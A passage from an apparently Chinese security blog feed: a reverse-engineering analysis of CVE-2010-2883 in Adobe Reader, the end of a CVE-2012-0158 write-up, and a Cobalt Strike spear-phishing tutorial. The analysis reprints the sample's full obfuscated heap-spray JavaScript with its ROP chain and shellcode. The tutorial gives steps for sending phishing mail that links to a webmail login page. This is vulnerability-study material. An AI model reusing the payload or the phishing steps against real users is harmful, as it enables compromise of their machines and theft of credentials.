<img src="/2021/05/19/CVE-2012-0158/image-20210306193328340.png" class="" title="image-20210306193328340">

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对于栈溢出漏洞的分析，都是通过栈回溯的方法找到漏洞函数，可在原栈顶（上层函数返回地址）下内存写断点。程序断下时，经常是在mov和rep movs等用于实现字符串复制的相关指令处，再通过栈回溯或者函数交叉引用定位漏洞函数地址；而对于ActiveX控件的调试，一般通过OLEAUT32模块中的DispCallFunc函数对首个call ecx指令下断跟进，此时进入的就是POC中调用的控件函数，就得逐个跟进call ecx去判断对应的是哪个控件函数。上面的调试方法也不是唯一的，比如通过指令运行记录功能，将POC分别在漏洞版本和修复版本的程序上运行，再通过对比运行指令的差异性，从中找到漏洞成因及修复方法。</p>
<p>参考文章：</p>
<p>《漏洞战争》</p>
]]></content>
      <categories>
        <category>Win逆向</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>office漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</title>
    <url>/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="0x1：漏洞描述"><a href="#0x1：漏洞描述" class="headerlink" title="0x1：漏洞描述"></a>0x1：漏洞描述</h3><p>​	CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的PDF文件就有可能导致执行任意代码。</p>
<h3 id="0x2：分析环境"><a href="#0x2：分析环境" class="headerlink" title="0x2：分析环境"></a>0x2：分析环境</h3><table>
<thead>
<tr>
<th align="left"></th>
<th>推荐使用的环境</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td align="left">操作系统</td>
<td>Windows XP SP3</td>
<td>简体中文版</td>
</tr>
<tr>
<td align="left">虚拟机</td>
<td>VMware</td>
<td></td>
</tr>
<tr>
<td align="left">调试器</td>
<td>OD</td>
<td></td>
</tr>
<tr>
<td align="left">反汇编器</td>
<td>IDA Pro</td>
<td>6.8</td>
</tr>
<tr>
<td align="left">漏洞软件</td>
<td>Adobe Reader</td>
<td>9.3.4</td>
</tr>
</tbody></table>
<span id="more"></span>

<h3 id="0x3：基于字符串定位的漏洞分析方法"><a href="#0x3：基于字符串定位的漏洞分析方法" class="headerlink" title="0x3：基于字符串定位的漏洞分析方法"></a>0x3：基于字符串定位的漏洞分析方法</h3><p>​	用IDA反汇编CoolType.dll库，查看字符串可发现”SING”字体，因为该字符串是漏洞解析出错的地方，直接定位进去即可查看该库对string表格的解析方式，==主要是strcat造成的溢出漏洞==：</p>
<pre><code class="asm">.text:0803DCF9
.text:0803DCF9 ; =============== S U B R O U T I N E =======================================
.text:0803DCF9
.text:0803DCF9 ; Attributes: bp-based frame fpd=108h
.text:0803DCF9
.text:0803DCF9 sub_803DCF9     proc near               ; CODE XREF: sub_803A3B2+55p
.text:0803DCF9                                         ; sub_803DFF4+28p ...
.text:0803DCF9
.text:0803DCF9 var_160         = byte ptr -160h
.text:0803DCF9 var_140         = dword ptr -140h
.text:0803DCF9 var_138         = dword ptr -138h
.text:0803DCF9 var_134         = dword ptr -134h
.text:0803DCF9 var_130         = dword ptr -130h
.text:0803DCF9 var_12C         = dword ptr -12Ch
.text:0803DCF9 var_128         = dword ptr -128h
.text:0803DCF9 var_124         = dword ptr -124h
.text:0803DCF9 var_120         = dword ptr -120h
.text:0803DCF9 var_119         = byte ptr -119h
.text:0803DCF9 var_114         = dword ptr -114h
.text:0803DCF9 var_10C         = dword ptr -10Ch
.text:0803DCF9 var_108         = byte ptr -108h
.text:0803DCF9 var_4           = dword ptr -4
.text:0803DCF9 arg_0           = dword ptr  8
.text:0803DCF9 arg_4           = dword ptr  0Ch
.text:0803DCF9 arg_8           = dword ptr  10h
.text:0803DCF9 arg_C           = dword ptr  14h
.text:0803DCF9
.text:0803DCF9                 push    ebp
.text:0803DCFA                 sub     esp, 104h	;分配栈空间0x104
.text:0803DD00                 lea     ebp, [esp-4]	;后面的strcat会把执行结果保存在ebp中
.text:0803DD04                 mov     eax, ___security_cookie
.text:0803DD09                 xor     eax, ebp
.text:0803DD0B                 mov     [ebp+108h+var_4], eax
.text:0803DD11                 push    4Ch
.text:0803DD13                 mov     eax, offset sub_8184A54
.text:0803DD18                 call    __EH_prolog3_catch
.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]
.text:0803DD23                 mov     edi, [ebp+108h+arg_0]
.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]
.text:0803DD2F                 mov     [ebp+108h+var_130], edi
.text:0803DD32                 mov     [ebp+108h+var_138], eax
.text:0803DD35                 call    sub_804172C
.text:0803DD3A                 xor     esi, esi
.text:0803DD3C                 cmp     dword ptr [edi+8], 3
.text:0803DD40                 mov     [ebp+108h+var_10C], esi
.text:0803DD43                 jz      loc_803DF00
.text:0803DD49                 mov     [ebp+108h+var_124], esi
.text:0803DD4C                 mov     [ebp+108h+var_120], esi
.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1
.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1
.text:0803DD57                 jnz     loc_803DEA9
.text:0803DD5D                 push    offset aName    ; "name"
.text:0803DD62                 push    edi             ; int
.text:0803DD63                 lea     ecx, [ebp+108h+var_124]
.text:0803DD66                 mov     [ebp+108h+var_119], 0
.text:0803DD6A                 call    sub_80217D7
.text:0803DD6F                 cmp     [ebp+108h+var_124], esi
.text:0803DD72                 jnz     short loc_803DDDD
.text:0803DD74                 push    offset aSing    ; "SING"
.text:0803DD79                 push    edi             ; int
.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]	;指向sing表入口
.text:0803DD7D                 call    sub_8021B06			   ;处理SING表
.text:0803DD82                 mov     eax, [ebp+108h+var_12C]
.text:0803DD85                 cmp     eax, esi					;判断是否为空
.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2
.text:0803DD8B                 jz      short loc_803DDC4		 ;这里不跳转
.text:0803DD8D                 mov     ecx, [eax]		;字体资源版本号，这里为1.0版本即00 10 00 00
.text:0803DD8F                 and     ecx, 0FFFFh
.text:0803DD95                 jz      short loc_803DD9F		 ;这里跳转
.text:0803DD97                 cmp     ecx, 100h
.text:0803DD9D                 jnz     short loc_803DDC0
.text:0803DD9F
.text:0803DD9F loc_803DD9F:                              ; CODE XREF: sub_803DCF9+9Cj
.text:0803DD9F                 add     eax, 10h			;相对string表偏移0x10处找到uniqueName
.text:0803DDA2                 push    eax               ; char * uniqueName域
.text:0803DDA3                 lea     eax, [ebp+108h+var_108]
.text:0803DDA6                 push    eax               ; char * 目的地址是一段固定大小的栈空间
.text:0803DDA7                 mov     [ebp+108h+var_108], 0
.text:0803DDAB                 call    strcat			;造成溢出！！
</code></pre>
<ul>
<li>由上可知，Adobe Reader在调用strcat的时候，未对uniqueName字段的字符串长度进行检测，将其直接复制到固定大小的栈空间中，最终导致栈溢出。</li>
</ul>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201013235707085.png" class="" title="image-20201013235707085">

<h3 id="0x4：样本Exploit技术分析"><a href="#0x4：样本Exploit技术分析" class="headerlink" title="0x4：样本Exploit技术分析"></a>0x4：样本Exploit技术分析</h3><p>​	用PdfStreamDumperd找到TTF并保存至本地</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201028234333765.png" class="" title="image-20201028234333765">

<center>找到TTF位置</center>

<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201028234401837.png" class="" title="image-20201028234401837">

<center>将TTF文件保存至本地</center>

<p>​	TableEntry结构数据</p>
<pre><code class="c"> typedef sturct_SING
 {
     char tag[4];	//"SING"
     ULONG checkSum;//校验和
     ULONG offset;	//相对文件偏移，0000011C
     ULONG length;	//数据长度
 } TableEntry;
</code></pre>
<p>​	保存下来之后我们可以用010Edit加载TTF模板来查看一下文件的结构，找到SING表的真实数据，</p>
<p>​	从TableEntry结构入口偏移0x11C即是SING表的真实数据，从<strong>00 00 01 00</strong> 开始的部分，接着再偏移0x10即可找到uniqueName域</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109215720617.png" class="" title="image-20201109215720617">

<center>uniqueName域</center>

<p>​		<strong>00 00 01 00</strong> 表示版本号，偏移0x10开始为uniqueName字段，大小为28字节且以0x00结尾。但是在CoolType.dll中，使用strcat对这个位置进行操作时没有判断长度，所以我们可以构造超长的uniqueName进行栈溢出。</p>
<h3 id="0x05：动态调试"><a href="#0x05：动态调试" class="headerlink" title="0x05：动态调试"></a>0x05：动态调试</h3><p>​	用OD加载Adobe Reader 按F9直接运行，运行起来之后在<strong>0x0803DD74</strong>（前面我们通过IDA找到的加载SING表的位置）下断点，然后打开poc.pdf。程序会断在此处。</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201029235903195.png" class="" title="image-20201029235903195">

<p>​	然后向下单步执行，在0X0803DD7A执行完之后，可以看到ECX被从栈中赋了一个值</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201104211542610.png" class="" title="image-20201104211542610">

<p>​	我们查看一下这个值中保存的内容，拿这个值跟上面通过010Edit查看到的值对比发现是一样的，可以判断这里存放的是SING表的数据。</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201104211659428.png" class="" title="image-20201104211659428">

<p>继续往下调试可以看到这里有个call，看一下参数明显是吧SING字符串当错参数传入进去了，F8步过继续往下调试。</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109201540699.png" class="" title="image-20201109201540699">

<p>这里看一下eax的值可以比较一下跟SING表入口的数据是一样的，这样我们可以猜测上面那个call的作用是用来取出SING表的数据<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109211515283.png" class="" title="image-20201109211515283"></p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109215720617.png" class="" title="image-20201109215720617">

<p>再继续往下调试我们就能找到上面再IDA里面找到的溢出点。这里我们可以看一下传递给strcat的参数，通过对比发现这个地址存放的是uniquename。继续F8执行。</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109233420281.png" class="" title="image-20201109233420281">

<p>执行strcat之后，会将<strong>58 E0 8D AD</strong> 起始的部分复制到ebp的指定地址（0x0012e4d8)，直至遇到NULL字符终止。我们对复制进去的这段数据（ebp指向的地址）设置内存访问断点，F9执行。</p>
<p>第一次断在字符串拷贝，每次拷贝一个字节，循环拷贝。</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109235316562.png" class="" title="image-20201109235316562">

<p>第二个地方断在字符串开始的地方，每次比较一个字节。</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201109235551091.png" class="" title="image-20201109235551091">

<p>继续往下跟踪可以找到下图的位置，0x4A8A08E2是样本中的数据，该地址必须为可读可写的，否则会导致出现异常。</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110000836183.png" class="" title="image-20201110000836183">

<p>继续执行下去将看到下图所示的地址。此处的call [eax]指令，[eax]=0x4A80CB38 (icucnv36.4A80CB38)</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110001742314.png" class="" title="image-20201110001742314">

<p>此地址对应的指令为：</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110002213991.png" class="" title="image-20201110002213991">

<center>ROP指令1</center>

<p>返回之后：</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110002529870.png" class="" title="image-20201110002529870">

<center>ROP指令2</center>

<p>我们再来看下TTF流中的样本数据，可以找到上面基础关键跳转地址的踪影：</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110002842137.png" class="" title="image-20201110002842137">

<p>跳转地址的稳定性其实主要依靠0x4A82A714和0x4A80CB38这两处地址，他们都位于icucnv36这块地址空间内，而在Adove Reader的各个版本上，这个dll上的这两处地址是始终不变的，因而保持了各个版本的兼容性和Exploit的稳定性。上面的0C0C0C0C正式样本特意构造的，然后再通过嵌入到PDF的JavaScript实现Heap Spary，进而跳入Shellcode执行代码。0x0C0C0C0C正是绕过DEP的关键部分，它是利用ROP技术实现的。</p>
<p>借助PdfStreamDumper来提取样本中的JavaScript代码。</p>
<pre><code class="javascript">var qXtjjwuwMZHJFnHFHIeKMsuymSwbvdoCpVQWidsXxgdOevIIdJDueXNhhaFuWpjEXlNYkQBcmKusAxoTqqySheWldNrQ = unescape;
var TuBHhjKjSQNWxYdXhwSUaUeAfYLLCe = qXtjjwuwMZHJFnHFHIeKMsuymSwbvdoCpVQWidsXxgdOevIIdJDueXNhhaFuWpjEXlNYkQBcmKusAxoTqqySheWldNrQ( '%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ue9bd%u49c0%udd6d%ud9c5%u2474%u5ff4%uc929%u31b1%u6f31%u8313%u04c7%u6f03%u22e6%u91bc%u2010%u6a3f%u45e0%u8fc9%u45d1%uc4ad%u7641%u89a5%ufd6d%u39eb%u73e6%u4d24%u394f%u6012%u1250%ue366%u69d2%uc3bb%ua1eb%u02ce%udf2c%u5623%uabe5%u4796%ue682%ue32a%ue7d8%u102a%u06a8%u871a%u50a3%u29bc%ue960%u31f5%ud465%uc94c%ua25d%u1b4e%u4bac%u62fc%ube01%ua3fc%u21a5%udd8b%udcd6%u198c%u3aa5%uba18%uc80d%u66ba%u1dac%uec5c%ueaa2%uaa2a%ueda6%uc0ff%u66d2%u06fe%u3c53%u8325%ue638%u9244%u49e4%uc478%u3547%u8edc%u2265%ucd6d%ub5e3%u6be3%ub541%u73fb%udef5%uf8ca%u999a%u2ad2%u56df%u7799%uff49%ue244%u62c8%ud877%u9b0e%ue9f4%u58ee%u9be4%u25eb%u70a2%u3681%u7747%u3636%u1442%ua4d9%uf50e%u4d7c%u09b4' );
var hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw = qXtjjwuwMZHJFnHFHIeKMsuymSwbvdoCpVQWidsXxgdOevIIdJDueXNhhaFuWpjEXlNYkQBcmKusAxoTqqySheWldNrQ( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
while (hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw.length + 20 + 8 &lt; 65536) hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw+=hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw;
AMdepunMDlBdcASwQxIXPGLFXVNQnQrUurHez = hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw.substring(0, (0x0c0c-0x24)/2);
AMdepunMDlBdcASwQxIXPGLFXVNQnQrUurHez += TuBHhjKjSQNWxYdXhwSUaUeAfYLLCe;
AMdepunMDlBdcASwQxIXPGLFXVNQnQrUurHez += hgHbuigmqMHFYcMUUwDsvvjYkPfvUjrkVPHIsjcNtTOJnPRFAyDLZFSOaHVkMWXNIpaw;
JXWEaKrHQPCtejKwqfCPofYNrtFlVIZGQrpuiwWQwWaCuEOfqQWTNslPPizGKncXoXwfgWiB = AMdepunMDlBdcASwQxIXPGLFXVNQnQrUurHez.substring(0, 65536/2);
while(JXWEaKrHQPCtejKwqfCPofYNrtFlVIZGQrpuiwWQwWaCuEOfqQWTNslPPizGKncXoXwfgWiB.length &lt; 0x80000) JXWEaKrHQPCtejKwqfCPofYNrtFlVIZGQrpuiwWQwWaCuEOfqQWTNslPPizGKncXoXwfgWiB += JXWEaKrHQPCtejKwqfCPofYNrtFlVIZGQrpuiwWQwWaCuEOfqQWTNslPPizGKncXoXwfgWiB;
GpzjaZkwEGsG = JXWEaKrHQPCtejKwqfCPofYNrtFlVIZGQrpuiwWQwWaCuEOfqQWTNslPPizGKncXoXwfgWiB.substring(0, 0x80000 - (0x1020-0x08) / 2);
var KkRYrQKZaeEulhPvabpTanhXVgnMmalrmTtKTmlkSrkkgM = new Array();
for (MHzOuXylamFYTUBOrCPPWcbkWJOMFnTFvtCRiJjNnptuQTlkQCNqlNGacncSxbbglbfBlfqsfqUHNE=0;MHzOuXylamFYTUBOrCPPWcbkWJOMFnTFvtCRiJjNnptuQTlkQCNqlNGacncSxbbglbfBlfqsfqUHNE&lt;0x1f0;MHzOuXylamFYTUBOrCPPWcbkWJOMFnTFvtCRiJjNnptuQTlkQCNqlNGacncSxbbglbfBlfqsfqUHNE++) KkRYrQKZaeEulhPvabpTanhXVgnMmalrmTtKTmlkSrkkgM[MHzOuXylamFYTUBOrCPPWcbkWJOMFnTFvtCRiJjNnptuQTlkQCNqlNGacncSxbbglbfBlfqsfqUHNE]=GpzjaZkwEGsG+"s";
</code></pre>
<p>当返回到栈顶（0C0C0C0C)后，栈的情况如下所示。</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110004506163.png" class="" title="image-20201110004506163">

<p>栈中的数据便是上面JS代码中的Shellcode，作者也正是利用它来实现ROP绕过DEP保护的。首先进入0x4A8063A5，然后再依次执行下面的ROP指令</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110004824363.png" class="" title="image-20201110004824363">

<center>ROP指令3</center>

<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005023971.png" class="" title="image-20201110005023971">

<center>ROP指令4</center>

<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005125716.png" class="" title="image-20201110005125716">

<center>构造CreaterFileA函数地址的ROP指令</center>

<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005307611.png" class="" title="image-20201110005307611">

<center>调用CreateFileA函数</center>

<p>调用CreateFileA函数时,栈上对应的各个参数情况如图所示，它创建了一个名为iso88591的文件</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005501083.png" class="" title="image-20201110005501083">

<p>返回之后，再通过跟上面相同的手法构造出ROP指令来调用CreateFileMapping,创建文件内存映射，调用CreateFileMapping时的栈中各个参数如下图</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005720538.png" class="" title="image-20201110005720538">

<p>然后，执行MapViewOfFile函数</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110005847673.png" class="" title="image-20201110005847673">

<p>然后，再执行memcpy函数</p>
<img src="/2021/05/19/CVE-2010-2883-Adobe-Reader-TTF%E5%AD%97%E4%BD%93SING%E8%A1%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/image-20201110010014506.png" class="" title="image-20201110010014506">

<p>其中目的地址就是前面MapViewOfFile返回的地址，而源地址就是真正的Shellcode代码，将他复制到一段可执行可读写的内存段，以此绕过DEP保护。由于构造的ROP指令均位于不受ASLR保护的icucnv36.dll模块，因此也可用于绕过ASLR保护。</p>
]]></content>
      <categories>
        <category>Win逆向</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Adobe Reader漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt-Strike-七 Cobalt Strike鱼叉钓鱼</title>
    <url>/2021/06/01/Cobalt-Strike-%E4%B8%83/</url>
    <content><![CDATA[<h1 id="鱼叉钓鱼"><a href="#鱼叉钓鱼" class="headerlink" title="鱼叉钓鱼"></a>鱼叉钓鱼</h1><p>鱼叉式<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC/1401858">网络钓鱼</a>（Spear phishing）指一种源于亚洲与东欧只针对特定目标进行攻击的网络<a href="https://baike.baidu.com/item/%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB">钓鱼攻击</a>。</p>
<p>鱼叉式网络钓鱼攻击针对特定组织内的特定目标个体。电子威胁 形势已发生了极大变化，从大量的垃圾邮件转向具有针对性的电 子邮件网络钓鱼活动，后者可对全球组织造成重大的财务、品牌和 运营损失。</p>
<p>例如，攻击者更加关注 高管和其他具有管理员权限的雇员，诱使其启动恶意软件，让犯罪 分子进入公司环境。这可能是勒索软件，先加密公司数据，然后借 机向受害者勒索费用。</p>
<span id="more"></span>

<h1 id="邮箱钓鱼模块使用"><a href="#邮箱钓鱼模块使用" class="headerlink" title="邮箱钓鱼模块使用"></a>邮箱钓鱼模块使用</h1><p>​	cobalt strike提供了一个邮箱钓鱼模块</p>
<p>​	我们来看一下这个模块怎么使用</p>
<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602141841455.png" class="" title="image-20210602141841455">

<h2 id="targets：创建一个新的文件"><a href="#targets：创建一个新的文件" class="headerlink" title="targets：创建一个新的文件"></a>targets：创建一个新的文件</h2><p>​	填写的内容记得邮箱和名字之间用tab隔开</p>
<p>​	<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150419372.png" class="" title="image-20210602150419372"></p>
<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150503064.png" class="" title="image-20210602150503064">

<h2 id="template：找一个新的邮件"><a href="#template：找一个新的邮件" class="headerlink" title="template：找一个新的邮件"></a>template：找一个新的邮件</h2><h3 id="点击显示邮件原文"><a href="#点击显示邮件原文" class="headerlink" title="点击显示邮件原文	"></a>点击显示邮件原文	<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602152733450.png" class="" title="image-20210602152733450"></h3><h3 id="将内容全部拷贝下来"><a href="#将内容全部拷贝下来" class="headerlink" title="将内容全部拷贝下来"></a>将内容全部拷贝下来</h3><img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602152941425.png" class="" title="image-20210602152941425">

<h3 id="粘贴进文件中"><a href="#粘贴进文件中" class="headerlink" title="粘贴进文件中	"></a>粘贴进文件中	<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602144146901.png" class="" title="image-20210602144146901"></h3><h3 id="填入文件路径"><a href="#填入文件路径" class="headerlink" title="填入文件路径"></a>填入文件路径</h3><img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150537254.png" class="" title="image-20210602150537254">

<h2 id="Attachment：这个可以用来上传附件，暂时先不用这个"><a href="#Attachment：这个可以用来上传附件，暂时先不用这个" class="headerlink" title="Attachment：这个可以用来上传附件，暂时先不用这个"></a>Attachment：这个可以用来上传附件，暂时先不用这个</h2><h2 id="Embed-URL：这里填入想跳转到的网址"><a href="#Embed-URL：这里填入想跳转到的网址" class="headerlink" title="Embed URL：这里填入想跳转到的网址"></a>Embed URL：这里填入想跳转到的网址</h2><h3 id="例如填写163邮箱的登陆页面"><a href="#例如填写163邮箱的登陆页面" class="headerlink" title="例如填写163邮箱的登陆页面"></a>例如填写163邮箱的登陆页面</h3><p>​	<code>https://mail.163.com/</code></p>
<p>​	<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150616327.png" class="" title="image-20210602150616327"></p>
<h2 id="填写发送邮箱的信息"><a href="#填写发送邮箱的信息" class="headerlink" title="填写发送邮箱的信息"></a>填写发送邮箱的信息</h2><p>​	<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150246895.png" class="" title="image-20210602150246895"></p>
<h2 id="Bounce-To：填入自己的邮箱名"><a href="#Bounce-To：填入自己的邮箱名" class="headerlink" title="Bounce To：填入自己的邮箱名"></a>Bounce To：填入自己的邮箱名</h2><p>​	<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602150806718.png" class="" title="image-20210602150806718"></p>
<h2 id="点击send，发送成功后会在send-email窗口显示发送SUCCESS"><a href="#点击send，发送成功后会在send-email窗口显示发送SUCCESS" class="headerlink" title="点击send，发送成功后会在send email窗口显示发送SUCCESS"></a>点击send，发送成功后会在send email窗口显示发送SUCCESS</h2><p>​	<img src="/2021/06/01/Cobalt-Strike-%E4%B8%83/image-20210602153953479.png" class="" title="image-20210602153953479"></p>
